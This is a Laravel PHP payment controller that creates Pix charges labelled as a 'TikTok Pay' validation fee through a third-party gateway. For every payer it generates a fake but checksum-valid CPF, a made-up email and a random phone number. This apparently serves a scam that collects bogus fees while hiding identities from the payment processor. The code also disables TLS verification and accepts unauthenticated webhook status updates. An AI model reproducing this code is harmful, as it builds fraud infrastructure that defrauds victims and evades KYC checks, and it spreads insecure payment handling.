<?php

namespace App\Http\Controllers;

use App\Models\Setting;
use App\Models\Transaction;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Log;

class PaymentController extends Controller
{
    private function getSetting($key, $default = null)
    {
        return Setting::where('key', $key)->first()?->value ?? $default;
    }

    private function generateFakeCPF()
    {
        $n = [];
        for ($i = 0; $i < 9; $i++) $n[] = rand(0, 9);
        for ($j = 0; $j < 2; $j++) {
            $sum = 0;
            for ($i = 0, $w = 10 + $j; $i < 9 + $j; $i++, $w--) $sum += $n[$i] * $w;
            $rem = $sum % 11;
            $n[] = ($rem < 2) ? 0 : 11 - $rem;
        }
        return implode('', $n);
    }
    private function generateQrCodeBase64(string $pixCode): ?string
{
    try {
        $url = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=' . urlencode($pixCode);
        
        $imageData = file_get_contents($url);
        
        if ($imageData === false) {
            return null;
        }
        
        return base64_encode($imageData);
    } catch (\Exception $e) {
        Log::error('Erro ao gerar QR Code: ' . $e->getMessage());
        return null;
    }
}

    public function create(Request $request)
    {
        $request->validate([
            'name' => 'required|string',
        ]);

        $apiKey = $this->getSetting('paradise_api_key');
        $productHash = $this->getSetting('paradise_product_hash');
        $taxValue = $this->getSetting('registration_tax_value', '20.19');

        if (!$apiKey) {
            return response()->json(['error' => 'Configuração do gateway pendente.'], 500);
        }

        $reference = 'PED-' . strtoupper(Str::random(10));
        $amount = (int) (floatval($taxValue) * 100); 

        $firstName = explode(' ', trim($request->name))[0];
        $email = strtolower($firstName) . rand(100, 999) . '@gmail.com';
        $phone = '119' . rand(7000, 9999) . rand(1000, 9999);
        $document = $this->generateFakeCPF();

        $payload = [
            'amount' => $amount,
            'description' => 'Taxa de Validação TikTok Pay',
            'reference' => $reference,
            'source' => 'api_externa',
            'customer' => [
                'name' => $request->name,
                'email' => $email,
                'phone' => $phone,
                'document' => $document,
            ]
        ];

        if ($productHash) {
            $payload['productHash'] = $productHash;
            unset($payload['source']);
        }

        $response = Http::withoutVerifying()->withHeaders([
            'X-API-Key' => $apiKey,
            'Content-Type' => 'application/json',
        ])->post('https://multi.paradisepags.com/api/v1/transaction.php', $payload);
        Log::info($response->json());

       
if ($response->successful()) {
    $data = $response->json();

    $qrCodeBase64 = $data['qr_code_base64'] ?? null;

    // Gera QR Code localmente sem nenhum pacote externo
    if (!$qrCodeBase64 && !empty($data['qr_code'])) {
        $qrCodeBase64 = $this->generateQrCodeBase64($data['qr_code']);
    }

    Transaction::create([
        'external_id'       => $data['transaction_id'] ?? $data['id'],
        'reference'         => $reference,
        'status'            => 'pending',
        'amount'            => $amount,
        'qr_code'           => $data['qr_code'] ?? null,
        'qr_code_base64'    => $qrCodeBase64,
        'customer_name'     => $request->name,
        'customer_email'    => $email,
        'customer_phone'    => $phone,
        'customer_document' => $document,
    ]);

    return response()->json([
        'status'         => 'success',
        'reference'      => $reference,
        'qr_code'        => $data['qr_code'],
        'qr_code_base64' => $qrCodeBase64,
        'amount'         => $amount / 100,
    ]);
}

        return response()->json([
            'status' => 'error',
            'message' => 'Falha ao gerar pagamento: ' . ($response->json()['message'] ?? 'Erro desconhecido'),
        ], 400);
    }

    public function checkStatus($reference)
    {
        $transaction = Transaction::where('reference', $reference)->first();
        if (!$transaction) return response()->json(['status' => 'not_found'], 404);

        return response()->json([
            'status' => $transaction->status,
            'reference' => $transaction->reference
        ]);
    }

    public function webhook(Request $request)
    {
        $transactionId = $request->transaction_id;
        $status = $request->status;

        $transaction = Transaction::where('external_id', $transactionId)
            ->orWhere('reference', $request->external_id)
            ->first();

        if ($transaction) {
            $transaction->update(['status' => $status]);
            return response()->json(['status' => 'ok']);
        }

        return response()->json(['status' => 'not_found'], 404);
    }
}
